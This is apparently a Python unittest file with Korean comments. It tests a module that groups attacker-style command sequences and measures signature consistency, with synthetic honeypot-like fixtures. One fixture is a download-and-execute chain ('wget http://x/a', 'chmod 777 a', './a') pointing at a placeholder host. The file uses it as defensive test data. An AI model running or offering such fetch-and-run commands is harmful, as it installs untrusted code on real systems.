"""ml/analysis/grouping.py 테스트. 모든 데이터는 테스트용 합성 값이다(실제 로그 아님)."""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from ml.analysis import grouping as g  # noqa: E402

A = ("sh", "enable", "system")
A2 = ("sh", "enable", "system", "busybox X")        # A의 변종(끝에 한 단계 추가)
B = ("cat /proc/cpuinfo", "uname -a")
C = ("wget http://x/a", "chmod 777 a", "./a")        # 전혀 다른 계열


class DistanceTests(unittest.TestCase):
    def test_identical_is_zero_and_symmetric(self):
        self.assertEqual(g.token_distance(A, A), 0.0)
        self.assertEqual(g.token_distance(A, A2), g.token_distance(A2, A))

    def test_normalized_by_longer_length(self):
        self.assertAlmostEqual(g.token_distance(A, A2), 1 / 4)
        self.assertEqual(g.token_distance(A, C), 1.0)  # 토큰이 하나도 안 겹치고 길이가 같으면 1

    def test_empty(self):
        self.assertEqual(g.token_distance((), ()), 0.0)
        self.assertEqual(g.token_distance((), A), 1.0)


class ExactGrouperTests(unittest.TestCase):
    def test_groups_by_identical_sequence_and_never_generalizes(self):
        gr = g.ExactGrouper().fit([A, B, C])
        self.assertEqual(len({gr.group_of[s] for s in (A, B, C)}), 3)
        self.assertEqual(gr.assign(A)[0], "group")
        self.assertEqual(gr.assign(A2), ("none", None))   # 훈련에 없던 순서는 배정하지 않는다


class EditGrouperTests(unittest.TestCase):
    def test_merges_near_variants_and_separates_distinct(self):
        gr = g.EditGrouper(threshold=0.3).fit([A, A2, B, C])
        self.assertEqual(gr.group_of[A], gr.group_of[A2])
        self.assertNotEqual(gr.group_of[A], gr.group_of[B])
        self.assertNotEqual(gr.group_of[B], gr.group_of[C])

    def test_assign_unseen_variant_within_threshold(self):
        gr = g.EditGrouper(threshold=0.3).fit([A, B, C])
        kind, gid = gr.assign(A2)                 # A와 거리 0.25
        self.assertEqual((kind, gid), ("group", gr.group_of[A]))
        self.assertEqual(gr.assign(("zzz",))[0], "none")  # 어느 것과도 멀다

    def test_threshold_chosen_from_training_only_and_deterministic(self):
        seqs = [A, A2, B, C, ("cat /proc/cpuinfo", "uname -a", "id")]
        t1 = g.EditGrouper().fit(seqs).threshold
        t2 = g.EditGrouper().fit(list(reversed(seqs))).threshold
        self.assertEqual(t1, t2)
        self.assertIn(t1, g.EDIT_THRESHOLD_GRID)


class ClusterGrouperTests(unittest.TestCase):
    def test_noise_is_kept_separate_not_merged(self):
        gr = g.ClusterGrouper({A: 0, A2: 0, B: 1, C: -1}, {("new",): -1, ("sh", "enable"): 0})
        self.assertEqual(gr.group_of[A], 0)
        self.assertEqual(gr.assign(("new",)), ("noise", None))
        self.assertEqual(gr.assign(("sh", "enable")), ("group", 0))
        self.assertNotIn(C, [s for s, v in gr.group_of.items() if v != "NOISE"])
        self.assertEqual(gr.group_of[C], g.NOISE)


class SignatureTests(unittest.TestCase):
    def test_signature_excludes_weak_rules(self):
        self.assertEqual(g.signature({"B19", "B11"}), frozenset({"B11"}))
        self.assertEqual(g.signature({"B19"}), frozenset())
        self.assertEqual(g.signature(set()), frozenset())


class ConsistencyTests(unittest.TestCase):
    def setUp(self):
        # 훈련: A(B11), A2(B11), B(B01), C(없음)
        self.train_sig = {A: frozenset({"B11"}), A2: frozenset({"B11"}), B: frozenset({"B01"}), C: frozenset()}
        self.group_of = {A: 0, A2: 0, B: 1, C: g.NOISE}
        self.maj = g.majority_signatures(self.group_of, self.train_sig)

    def test_majority_signature_per_group_excludes_noise_group(self):
        self.assertEqual(self.maj[0], frozenset({"B11"}))
        self.assertEqual(self.maj[1], frozenset({"B01"}))

    def test_purity(self):
        p = g.train_purity(self.group_of, self.train_sig)
        self.assertEqual(p["groups"], 2)
        self.assertEqual(p["multi_seq_groups"], 1)
        self.assertEqual(p["mean_purity_multi_seq"], 1.0)

    def _outcomes(self):
        return {("e1",): ("group", 0), ("e2",): ("group", 1), ("e3",): ("noise", None), ("e4",): ("none", None)}

    def test_modes_change_the_denominator_and_are_all_reported(self):
        eval_sig = {("e1",): frozenset({"B11"}),    # 올바른 군집
                    ("e2",): frozenset({"B11"}),    # 다른 군집(불일치)
                    ("e3",): frozenset({"B11"}),    # 노이즈
                    ("e4",): frozenset({"B01"})}    # 미배정
        res = g.consistency(self._outcomes(), eval_sig, self.maj, noise_sig=frozenset({"B11"}))
        self.assertEqual(res["separate"], {"consistent": 1, "denominator": 4, "rate": 0.25})
        self.assertEqual(res["excluded"], {"consistent": 1, "denominator": 2, "rate": 0.5})
        # 한 군집 취급: 노이즈 군집의 다수 서명이 B11이라 e3이 일치, 미배정 e4(B01)는 불일치
        self.assertEqual(res["one_group"], {"consistent": 2, "denominator": 4, "rate": 0.5})

    def test_only_sequences_with_a_specific_rule_are_in_the_denominator(self):
        eval_sig = {("e1",): frozenset({"B11"}), ("e2",): frozenset(), ("e3",): frozenset(), ("e4",): frozenset()}
        res = g.consistency(self._outcomes(), eval_sig, self.maj, noise_sig=frozenset())
        self.assertEqual(res["separate"]["denominator"], 1)

    def test_empty_denominator_gives_none_rate(self):
        res = g.consistency({}, {}, {}, noise_sig=frozenset())
        self.assertIsNone(res["separate"]["rate"])


class UnassignedCompositionTests(unittest.TestCase):
    def test_noise_is_reported_as_its_own_analysis_target(self):
        outcomes = {("a",): ("noise", None), ("b",): ("none", None), ("c",): ("group", 0)}
        sig = {("a",): frozenset({"B11"}), ("b",): frozenset(), ("c",): frozenset({"B11"})}
        w = {("a",): 10, ("b",): 3, ("c",): 100}
        comp = g.unassigned_composition(outcomes, sig, w, weak_only={("b",)})
        self.assertEqual(comp["noise"]["seqs"], 1)
        self.assertEqual(comp["noise"]["sessions"], 10)
        self.assertEqual(comp["noise"]["with_specific_rule"], 1)
        self.assertEqual(comp["none"]["with_specific_rule"], 0)
        self.assertEqual(comp["none"]["weak_only"], 1)


class UnitMetricsTests(unittest.TestCase):
    def test_session_ip_and_seq_units(self):
        outcome_ok = {("e1",): True, ("e2",): False}
        eval_records = [(("e1",), "1.1.1.1"), (("e1",), "2.2.2.2"), (("e2",), "1.1.1.1"), (("e2",), "3.3.3.3")]
        m = g.unit_rates(outcome_ok, eval_records)
        self.assertEqual(m["unique_seq"], {"ok": 1, "total": 2, "rate": 0.5})
        self.assertEqual(m["session"], {"ok": 2, "total": 4, "rate": 0.5})
        self.assertEqual(m["ip"], {"ok": 2, "total": 3, "rate": 0.6667})   # 1.1.1.1과 2.2.2.2가 e1로 ok


if __name__ == "__main__":
    unittest.main()
